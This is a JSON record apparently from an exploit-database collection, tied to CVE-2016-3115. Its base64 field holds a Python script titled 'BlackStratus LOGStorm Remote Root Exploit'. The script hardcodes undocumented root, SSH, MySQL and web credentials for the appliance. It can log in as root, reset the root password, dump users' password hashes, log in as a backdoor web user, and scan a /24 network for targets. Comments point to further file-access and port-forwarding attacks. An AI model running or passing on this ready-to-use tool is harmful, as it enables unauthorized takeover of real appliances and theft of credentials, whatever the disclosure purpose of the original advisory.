{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2Jpbi9weXRob24NCiMgbG9nc3Rvcm0tcm9vdC5weQ0KIw0KIyBCbGFja1N0cmF0dXMgTE9HU3Rvcm0gUmVtb3RlIFJvb3QgRXhwbG9pdA0KIw0KIyBKZXJlbXkgQnJvd24gW2picm93bjMyNjQvZ21haWxdDQojIERlYyAyMDE2DQojDQojIC1TeW5vcHNpcy0NCiMNCiMgIkJldHRlciBTZWN1cml0eSBhbmQgQ29tcGxpYW5jZSBmb3IgQW55IFNpemUgQnVzaW5lc3MiDQojDQojIEJsYWNrU3RyYXR1cyBMT0dTdG9ybSBoYXMgbXVsdGlwbGUgdnVsbmVyYWJpbGl0aWVzIHRoYXQgYWxsb3cgYSByZW1vdGUgdW5hdXRoZW50aWNhdGVkIHVzZXIsIGFtb25nDQojIG90aGVyIHRoaW5ncywgdG8gYXNzdW1lIGNvbXBsZXRlIGNvbnRyb2wgb3ZlciB0aGUgdmlydHVhbCBhcHBsaWFuY2Ugd2l0aCByb290IHByaXZpbGVnZXMuIFRoaXMgaXMNCiMgcG9zc2libGUgZHVlIHRvIG11bHRpcGxlIG5ldHdvcmsgc2VydmVycyBsaXN0ZW5pbmcgZm9yIG5ldHdvcmsgY29ubmVjdGlvbnMgYnkgZGVmYXVsdCwgYWxsb3dpbmcNCiMgYXV0aG9yaXphdGlvbiB3aXRoIHVuZG9jdW1lbnRlZCBjcmVkZW50aWFscyBzdXBwb3J0ZWQgYnkgYXBwbGlhbmNlJ3MgT1MsIHdlYiBpbnRlcmZhY2UgYW5kIHNxbCBzZXJ2ZXIuDQojDQojIC1UZXN0ZWQtDQojDQojIHY0LjUuMS4zNQ0KIyB2NC41LjEuOTYNCiMNCiMgLVVzYWdlLQ0KIw0KIyBEZXBlbmRlbmNpZXM6IHBpcCBpbnN0YWxsIHBhcmFtaWtvIE15U1FMLXB5dGhvbg0KIw0KIyBUaGVyZSBhcmUgKDUpIGFjdGlvbnMgcHJvdmlkZWQgaW4gdGhpcyBzY3JpcHQ6IHJvb3QsIHJlc2V0LCBzcWwsIHdlYiBhbmQgc2Nhbi4NCiMNCiMgW3Jvb3RdICB1dGlsaXplcyBidWcgIzEgdG8gc3NoIGxvZ2luIHRvIGEgZ2l2ZW4gPGhvc3Q+IGFzIHJvb3QgYW5kIHJ1biB0aGUgJ2lkJyBjb21tYW5kDQojIFtyZXNldF0gdXRpbGl6ZXMgYnVnICMyIHRvIHNzaCBsb2dpbiB0byBhIGdpdmVuIDxob3N0PiBhcyBwcml2aWxlZ2VkIGh0aW5pdCB1c2VyIGFuZCByZXNldHMgdGhlIHJvb3QgcGFzc3dvcmQNCiMgW3NxbCpdICB1dGlsaXplcyBidWcgIzMgdG8gc3FsIGxvZ2luIHRvIGEgZ2l2ZW4gPGhvc3Q+IGFzIHByaXZpbGVnZWQgaHRyIHVzZXIgYW5kIHJldHJpZXZlIHdlYiBwb3J0YWwgY3JlZGVudGlhbHMNCiMgW3dlYl0gICB1dGlsaXplcyBidWcgIzQgdG8gaHR0cCBsb2dpbiB0byBhIGdpdmVuIDxob3N0PiBhcyBoYXJkY29kZWQgd2Vic2VydmVydXNlciAocHJlc3VtYWJseSkgYWRtaW4gYWNjb3VudA0KIyBbc2Nhbl0gIHNjYW5zIGEgZ2l2ZW4gPGhvc3Q+LzI0IGZvciBwb3RlbnRpYWxseSB2dWxuZXJhYmxlIGFwcGxpYW5jZXMNCiMNCiMgKnNxbCBvbmx5IHdvcmtzIHJlbW90ZWx5IGJlZm9yZSBsaWNlbnNlIHZhbGlkYXRpb24gYXMgYWZ0ZXJ3YXJkcyBzcWwgc2VydmVyIGdldHMgZmlyZXdhbGxlZCwgYmVjb21pbmcgbG9jYWwgb25seS4NCiMNCiMgTm90ZTogdGhpcyBleHBsb2l0IGlzIG5vdCBhbmQgY2Fubm90IGJlIHdlYXBvbml6ZWQgc2ltcGx5IGJlY2F1c2UgZXhwbG9pdHMgYXJlIG5vdCB3ZWFwb25zLg0KIw0KIyAtRml4ZXMtDQojDQojIEJsYWNrU3RyYXR1cyBkaWQgbm90IGNvaGVyZW50bHkgcmVzcG9uZCB0byBwcm9kdWN0IHNlY3VyaXR5IGlucXVpcmllcywgc28gdGhlcmUncyBubyBvZmZpY2lhbCBmaXguIEJ1dA0KIyBjdXN0b21lcnMgbWF5IChub3cpIHJvb3QgdGhlIGFwcGxpYW5jZSB0aGVtc2VsdmVzIHRvIGNoYW5nZSB0aGUgcGFzc3dvcmRzLCBkaXNhYmxlIHJvb3QgbG9naW4sIGZpcmV3YWxsDQojIG5ldHdvcmsgc2VydmljZXMgb3IgcmVtb3ZlIGFkZGl0aW9uYWwgdXNlciBhY2NvdW50cyB0byBtaXRpZ2F0ZSB0aGVzZSB2dWxuZXJhYmlsaXRpZXMuLiBvciBjaG9vc2UgYW5vdGhlcg0KIyBwcm9kdWN0IGFsdG9nZXRoZXIgYmVjYXVzZSB0aGlzIGFwcGxpYW5jZSwgYXMgb2YgdG9kYXksIHNpbXBseSBhZGRzIHRvbyBtdWNoIGF0dGFjayBzdXJmYWNlIHRvIHRoZSBuZXR3b3JrLg0KIw0KIyAtQm9udXNlcy0NCiMNCiMgMSkgQW5vdGhlciBhY2NvdW50J3MgKGh0ZnRwL2h0ZnRwKSBzaGVsbCBpcyBzZXQgdG8gL2Jpbi9mYWxzZSwgd2hpY2ggYWZmb3JkcyBhdCBsZWFzdCBhIGNvdXBsZSBhdHRhY2tzDQojIA0KIyAxLjEpIFRoZSBhcHBsaWFuY2UgaXMgdnVsbmVyYWJsZSB0byBDVkUtMjAxNi0zMTE1LCB3aGljaCB3ZSBjYW4gdXNlIHRvIHJlYWQvd3JpdGUgdG8gYXJiaXRyYXJ5IGZpbGVzDQojIDEuMikgV2UgY2FuIHVzZSB0aGUgbG9naW4gdG8gZG8gcG9ydCBmb3J3YXJkaW5nIGFuZCBoaXQgbG9jYWwgc2VydmljZXMsIHN1Y2ggYXMgdGhlIEphdmEgaW5zdGFuY2UgcnVubmluZw0KIyBpbiBkZWJ1ZyBtb2RlIGFuZCBwcm9iYWJseSBleHBsb2l0YWJsZSB3aXRoIGpkd3Atc2hlbGxpZmVyLnB5IChhbHNvIG5ldGNhdCB3aXRoIC1lIGlzIGluc3RhbGxlZCBieSBkZWZhdWx0ISkNCiMNCiMgMikgTW9yZSBzcWwgYWNjb3VudHM6IGh0bS9odG1fcHdkIGFuZCB0dnMvdHZzX3B3ZA0KIw0KDQppbXBvcnQgc3lzDQppbXBvcnQgc29ja2V0DQppbXBvcnQgdGltZQ0KZnJvbSBwYXJhbWlrbyBpbXBvcnQgc3NoX2V4Y2VwdGlvbg0KaW1wb3J0IHBhcmFtaWtvDQppbXBvcnQgTXlTUUxkYg0KaW1wb3J0IGh0dHBsaWINCmltcG9ydCB1cmxsaWINCg0KU1NIX0JBTk5FUiA9ICJfL18vXy9fLyINClNTSF9QT1JUID0gMjINCk1ZU1FMX1BPUlQgPSAzMzA2DQpNWVNRTF9EQiA9ICJodHIiDQpNWVNRTF9DTUQgPSAic2VsZWN0IFVTRVJfSUQsaGV4KE1ENV9QQVNTV09SRCkgZnJvbSB1c2VyczsiDQpXRUJfVVJMID0gIi90dnMvbGF5b3V0L2pfc2VjdXJpdHlfY2hlY2siDQoNClJPT1RfQ1JFRFMgPSAgIFsicm9vdCIsICIzIWFjSzV0cmF0dTUiXQ0KSFRJTklUX0NSRURTID0gWyJodGluaXQiLCAiaHRpbml0Il0NCk1ZU1FMX0NSRURTID0gIFsiaHRyIiwgImh0cl9wd2QiXQ0KV0VCX0NSRURTID0gICAgWyJ3ZWJzZXJ2aWNldXNlciIsICJkb25vdENoYW5nZU9uSW5zdGFsbCJdDQoNCg0KZGVmIG1haW4oKToNCiAgICBpZihsZW4oc3lzLmFyZ3YpIDwgMik6DQogICAgICAgIHByaW50KCJVc2FnZTogJXMgPGFjdGlvbj4gPGhvc3Q+IiAlIHN5cy5hcmd2WzBdKQ0KICAgICAgICBwcmludCgiRWcuICAgICVzIHJvb3QgMTAuMS4xLjNcbiIgJSBzeXMuYXJndlswXSkNCiAgICAgICAgcHJpbnQoIkFjdGlvbnM6IHJvb3QgcmVzZXQgc3FsIHdlYiBzY2FuIikNCiAgICAgICAgcmV0dXJuDQogDQogICAgYWN0aW9uID0gc3RyKHN5cy5hcmd2WzFdKQ0KICAgIGhvc3QgPSBzdHIoc3lzLmFyZ3ZbMl0pDQoNCiAgICBpZigic2NhbiIgbm90IGluIGFjdGlvbik6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIHNvY2tldC5pbmV0X2F0b24oaG9zdCkNCiAgICAgICAgZXhjZXB0IHNvY2tldC5lcnJvcjoNCiAgICAgICAgICAgIHByaW50KCJbLV0gJXMgZG9lc24ndCBsb29rIGxpa2UgYSB2YWxpZCBpcCBhZGRyZXNzIiAlIGhvc3QpDQogICAgICAgICAgICByZXR1cm4NCg0KICAgIHNzaCA9IHBhcmFtaWtvLlNTSENsaWVudCgpDQogICAgc3NoLnNldF9taXNzaW5nX2hvc3Rfa2V5X3BvbGljeShwYXJhbWlrby5BdXRvQWRkUG9saWN5KCkpDQoNCiAgICAjDQogICAgIyBzc2ggbG9naW4gYXMgcm9vdCBhbmQgZXhlY3V0ZSAnaWQnDQogICAgIw0KICAgIGlmKGFjdGlvbiA9PSAicm9vdCIpOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBzc2guY29ubmVjdChob3N0LCBTU0hfUE9SVCwgUk9PVF9DUkVEU1swXSwgUk9PVF9DUkVEU1sxXSwgdGltZW91dD1TU0hfVElNRU9VVCkNCiAgICAgICAgZXhjZXB0IHNzaF9leGNlcHRpb24uQXV0aGVudGljYXRpb25FeGNlcHRpb246DQogICAgICAgICAgICBwcmludCgiXG5bLV0gQWN0aW9uIGZhaWxlZCwgY291bGQgbm90IGxvZ2luIHdpdGggcm9vdCBjcmVkZW50aWFsc1xuIikNCiAgICAgICAgICAgIHJldHVybg0KDQogICAgICAgIHByaW50KCJbK10gU3VjY2VzcyEiKQ0KICAgICAgICBzc2hfc3RkaW4sIHNzaF9zdGRvdXQsIHNzaF9zdGRlcnIgPSBzc2guZXhlY19jb21tYW5kKCJpZCIpDQogICAgICAgIHByaW50KHNzaF9zdGRvdXQucmVhZGxpbmUoKSkNCg0KICAgICAgICByZXR1cm4NCg0KICAgICMNCiAgICAjIHNzaCBsb2dpbiBhcyBodGluaXQgYW5kIHJlc2V0IHJvb3QgcGFzc3dvcmQgdG8gdGhlIGRlZmF1bHQNCiAgICAjDQogICAgZWxpZihhY3Rpb24gPT0gInJlc2V0Iik6DQogICAgICAgIHByaW50KCJbfl0gUmVzZXR0aW5nIHBhc3N3b3JkIG9uICVzLi4uIiAlIGhvc3QpDQoNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgc3NoLmNvbm5lY3QoaG9zdCwgU1NIX1BPUlQsIEhUSU5JVF9DUkVEU1swXSwgSFRJTklUX0NSRURTWzFdLCB0aW1lb3V0PVNTSF9USU1FT1VUKQ0KICAgICAgICBleGNlcHQgc3NoX2V4Y2VwdGlvbi5BdXRoZW50aWNhdGlvbkV4Y2VwdGlvbjoNCiAgICAgICAgICAgIHByaW50KCJcblstXSBSZXNldCBmYWlsZWQsIGNvdWxkIG5vdCBsb2dpbiB3aXRoIGh0aW5pdCBjcmVkZW50aWFsc1xuIikNCiAgICAgICAgICAgIHJldHVybg0KDQogICAgICAgIHNzaF9zdGRpbiwgc3NoX3N0ZG91dCwgc3NoX3N0ZGVyciA9IHNzaC5leGVjX2NvbW1hbmQoIiIpDQoNCiAgICAgICAgc3NoX3N0ZGluLndyaXRlKCI0IiArICJcbiIpDQogICAgICAgIHRpbWUuc2xlZXAoMikNCiAgICAgICAgc3NoX3N0ZGluLndyaXRlKFJPT1RfQ1JFRFNbMV0gKyAiXG4iKQ0KICAgICAgICB0aW1lLnNsZWVwKDIpDQogICAgICAgIHNzaF9zdGRpbi53cml0ZSgiXkMiICsgIlxuIikNCiAgICAgICAgdGltZS5zbGVlcCgxKQ0KDQogICAgICAgIHByaW50KCJbK10gQXBwbGlhbmNlIHJvb3QgcGFzc3dvcmQgc2hvdWxkIG5vdyBiZSByZXNldCIpDQoNCiAgICAgICAgcmV0dXJuDQoNCiAgICAjDQogICAgIyBzcWwgbG9naW4gYXMgaHRyIGFuZCBzZWxlY3QgdXNlci9oYXNoIGNvbHVtbnMgZnJvbSB0aGUgd2ViIHVzZXJzIHRhYmxlDQogICAgIw0KICAgIGVsaWYoYWN0aW9uID09ICJzcWwiKToNCiAgICAgICAgcHJpbnQoIlt+XSBBc2tpbmcgJXMgZm9yIGl0J3Mgd2ViIHVzZXJzIGFuZCB0aGVpciBwYXNzd29yZCBoYXNoZXMuLi4iICUgaG9zdCkNCg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBkYiA9IE15U1FMZGIuY29ubmVjdChob3N0PWhvc3QsIHBvcnQ9TVlTUUxfUE9SVCwgdXNlcj1NWVNRTF9DUkVEU1swXSwgcGFzc3dkPU1ZU1FMX0NSRURTWzFdLCBkYj1NWVNRTF9EQiwgY29ubmVjdF90aW1lb3V0PTMpDQogICAgICAgIGV4Y2VwdCBNeVNRTGRiLkVycm9yIGFzIGVycm9yOg0KICAgICAgICAgICAgcHJpbnQoIlxuWy1dIEZhaWxlZCB0byBjb25uZWN0IHRvICVzOlxuJXNcbiIgJSAoaG9zdCwgZXJyb3IpKQ0KICAgICAgICAgICAgcmV0dXJuDQoNCiAgICAgICAgY3Vyc29yID0gZGIuY3Vyc29yKCkNCiAgICAgICAgY3Vyc29yLmV4ZWN1dGUoTVlTUUxfQ01EKQ0KDQogICAgICAgIGRhdGEgPSBjdXJzb3IuZmV0Y2hhbGwoKQ0KDQogICAgICAgIHByaW50KCJbK10gR290IGNyZWRzIVxuIikNCg0KICAgICAgICBmb3Igcm93IGluIGRhdGE6DQogICAgICAgICAgICBwcmludCgiVVNFUl9JRDogJXNcbk1ENV9QQVNTV09SRDogJXNcbiIgJSAocm93WzBdLCByb3dbMV0pKQ0KDQogICAgICAgIGRiLmNsb3NlKCkNCg0KICAgICAgICByZXR1cm4NCg0KICAgICMNCiAgICAjIGh0dHAgbG9naW4gYXMgd2Vic2VydmljZXVzZXIgYW5kIGdhaW4gcHJlc3VtYWJseSBhZG1pbiBwcml2aWxlZ2VzDQogICAgIw0KICAgIGVsaWYoYWN0aW9uID09ICJ3ZWIiKToNCiAgICAgICAgcHJpbnQoIlt+XSBBdHRlbXB0aW5nIHRvIGxvZ2luIGFzIGJhY2tkb29yIHdlYiB1c2VyIGF0ICVzLi4uIiAlIGhvc3QpDQoNCiAgICAgICAgdHJ5OiAgIA0KICAgICAgICAgICAgY2xpZW50ID0gaHR0cGxpYi5IVFRQU0Nvbm5lY3Rpb24oaG9zdCkNCiAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgcHJpbnQoIlstXSBDb3VsZG4ndCBlc3RhYmxpc2ggU1NMIGNvbm5lY3Rpb24gdG8gJXMiICUgaG9zdCkNCiAgICAgICAgICAgIHJldHVybg0KDQogICAgICAgIHBhcmFtcyA9IHVybGxpYi51cmxlbmNvZGUoeyJqX3VzZXJuYW1lIiA6IFdFQl9DUkVEU1swXSwgImpfcGFzc3dvcmQiIDogV0VCX0NSRURTWzFdfSkNCiAgICAgICAgaGVhZGVycyA9IHsiSG9zdCIgOiBob3N0LCAiQ29udGVudC1UeXBlIiA6ICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiLCAiQ29udGVudC1MZW5ndGgiIDogIjU3In0NCg0KICAgICAgICBjbGllbnQucmVxdWVzdCgiUE9TVCIsIFdFQl9VUkwsIHBhcmFtcywgaGVhZGVycykNCg0KICAgICAgICByZXNwb25zZSA9IGNsaWVudC5nZXRyZXNwb25zZSgpDQoNCiAgICAgICAgaWYocmVzcG9uc2Uuc3RhdHVzID09IDQwOCk6DQogICAgICAgICAgICBwcmludCgiWytdIFN1Y2Nlc3MhIikNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHByaW50KCJbLV0gU2VydmljZSByZXR1cm5lZCAlZCAlcywgd2hpY2ggaXMgYWN0dWFsbHkgbm90IG91ciBjcml0ZXJpYSBmb3Igc3VjY2VzcyIgJSAocmVzcG9uc2Uuc3RhdHVzLCByZXNwb25zZS5yZWFzb24pKQ0KDQogICAgICAgIHJldHVybg0KDQogICAgIw0KICAgICMgY2hlY2sgdGhlIHNzaCBuZXR3b3JrIGJhbm5lciB0byBpZGVudGlmeSBhcHBsaWFuY2VzIHdpdGhpbiByYW5nZSBvZiA8aG9zdD4vMjQNCiAgICAjDQogICAgZWxpZihhY3Rpb24gPT0gInNjYW4iKToNCiAgICAgICAgY291bnQgPSAwDQogICAgICAgIHByaW50KCJbfl0gU2Nhbm5pbmcgJXMgZm9yIExPR1N0b3JtIGFwcGxpYW5jZXMuLi4iICUgc3lzLmFyZ3ZbMl0pDQoNCiAgICAgICAgZm9yIHggaW4gcmFuZ2UoMSwyNTUpOg0KICAgICAgICAgICAgYmFubmVyID0gTm9uZQ0KDQogICAgICAgICAgICAjDQogICAgICAgICAgICAjIDEwLjEuMS4xLzI0IC0+IDEwLjEuMS5beF0NCiAgICAgICAgICAgICMNCiAgICAgICAgICAgIGhvc3QgPSBzdHIoc3lzLmFyZ3ZbMl0pLnNwbGl0KCcvJylbMF1bOi0xXSArIHN0cih4KQ0KDQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgc3NoLmNvbm5lY3QoaG9zdCwgU1NIX1BPUlQsICJ1c2VyLXRoYXQtZG9lc250LWV4aXN0IiwgInBhc3MtdGhhdC1kb2VzbnQtd29yayIsIHRpbWVvdXQ9MikNCiAgICAgICAgICAgIGV4Y2VwdCBzc2hfZXhjZXB0aW9uLk5vVmFsaWRDb25uZWN0aW9uc0Vycm9yOg0KICAgICAgICAgICAgICAgIHBhc3MNCiAgICAgICAgICAgIGV4Y2VwdCBzb2NrZXQudGltZW91dDoNCiAgICAgICAgICAgICAgICBwYXNzDQogICAgICAgICAgICBleGNlcHQgc3NoX2V4Y2VwdGlvbi5BdXRoZW50aWNhdGlvbkV4Y2VwdGlvbiBhcyBlcnJvcjoNCiAgICAgICAgICAgICAgICBiYW5uZXIgPSBzc2guX3RyYW5zcG9ydC5nZXRfYmFubmVyKCkNCiAgICAgICAgICAgICAgICBpZiBiYW5uZXIgYW5kIFNTSF9CQU5ORVIgaW4gYmFubmVyOg0KICAgICAgICAgICAgICAgICAgICBwcmludCgiWyFdICVzXG4iICUgaG9zdCkNCiAgICAgICAgICAgICAgICAgICAgY291bnQrPTENCg0KICAgICAgICBwcmludCgiWytdIEZvdW5kICVkIGFwcGxpYW5jZShzKSIlIGNvdW50KQ0KDQogICAgICAgIHJldHVybg0KDQogDQppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOg0KICAgIG1haW4oKQ==", 
    "filename": "platforms/hardware/remote/40858.py", 
    "id": "40858", 
    "cves": [
        "CVE-2016-3115"
    ]
}